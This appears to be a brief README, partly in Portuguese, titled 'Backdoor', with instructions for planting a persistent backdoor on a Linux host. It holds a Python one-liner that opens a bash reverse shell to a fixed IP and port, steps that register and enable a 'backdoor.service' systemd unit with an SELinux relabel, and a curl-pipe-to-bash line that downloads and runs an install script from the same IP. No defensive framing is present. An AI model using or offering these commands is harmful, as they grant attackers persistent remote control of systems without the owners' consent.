# Backdoor

> import os ; os.system('bash -i >& /dev/tcp/45.171.127.130/8000 0>&1')

### Selinux
restorecon -RFv /usr/lib/systemd/system/backdoor.service

### Systemd
cp backdoor.service /usr/lib/systemd/system/
systemctl daemon-reload
systemctl start backdoor.service
systemctl enable backdoor.service

### Instalação
curl -s -L http://45.171.127.130/install.sh | bash